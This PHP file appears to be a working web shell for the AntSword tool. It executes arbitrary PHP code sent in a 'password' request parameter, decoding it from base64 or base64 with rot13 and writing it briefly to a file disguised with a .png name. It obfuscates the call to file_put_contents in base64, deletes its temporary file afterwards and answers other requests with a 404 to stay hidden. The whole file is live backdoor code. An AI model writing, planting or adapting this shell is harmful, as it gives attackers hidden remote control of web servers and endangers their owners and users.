<?php
error_reporting(E_ALL);
$request = $_REQUEST;
class AntSword
{
	private $code;
	public function __construct()
	{
		$password = $this->request('password');
		$code = $password ? $this->decode($password) : $this->response404();
		if (empty($code)) $this->response404();
		$this->code = $code;
	}
	public function file()
	{
		$content = '<?php' . PHP_EOL . $this->code;
		$file_name = md5_file(__FILE__) . '.png';
		call_user_func(base64_decode('ZmlsZV9wdXRfY29udGVudHM='), $file_name, $content);
		chmod($file_name, 0755);
		return $file_name;
	}
	public function request($name, $default = null)
	{
		global $request;
		return empty($request[$name]) ? $default : $request[$name];
	}
	public function decode($content)
	{
		$codec = $this->request('codec', 'default');
		if ($codec == 'base64_rot13') {
			return base64_decode(str_rot13($content));
		}
		if ($codec == 'base64') {
			return base64_decode($content);
		}
		return $content;
	}
	public function response404()
	{
		if (function_exists('http_response_code')) http_response_code(404);
		exit;
	}
}
$file_name = (new AntSword)->file();
error_reporting(E_ERROR);
require $file_name;
if (is_file($file_name)) {
	call_user_func(base64_decode('ZmlsZV9wdXRfY29udGVudHM='), $file_name, '');
	unlink($file_name);
}